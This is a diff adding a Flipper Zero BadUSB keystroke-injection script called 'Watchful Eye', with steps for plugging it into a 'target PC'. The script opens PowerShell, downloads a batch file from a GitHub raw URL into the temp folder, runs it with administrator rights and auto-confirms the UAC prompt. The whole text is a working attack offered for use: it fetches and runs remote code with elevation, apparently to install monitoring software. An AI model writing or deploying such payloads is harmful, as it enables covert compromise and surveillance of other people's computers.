@@ -1,0 +1,36 @@
+# Watchful Eye - Flipper Zero BadUSB (Hardcoded)
+# 
+# Variables are hardcoded for reliability
+#
+# TO USE:
+#   1. Copy to: Flipper SD:/badusb/WatchfulEye/
+#   2. On Flipper: BadUSB > WatchfulEye
+#   3. Plug into target PC
+#   4. Press center button
+#   5. Click Yes on UAC
+
+REM Open Run dialog
+DELAY 500
+GUI r
+DELAY 700
+
+REM Open PowerShell
+STRING powershell
+DELAY 300
+ENTER
+DELAY 500
+
+REM Download the setup script
+STRING irm https://raw.githubusercontent.com/kareemamindumontj/Watchful-Eye/main/setup.bat -OutFile $env:TEMP\we.bat
+DELAY 200
+ENTER
+DELAY 1000
+
+REM Run it with admin rights
+STRING Start-Process cmd -ArgumentList "/c $env:TEMP\we.bat" -Verb RunAs
+DELAY 200
+ENTER
+DELAY 2000
+
+REM Click Yes on UAC
+ALT y
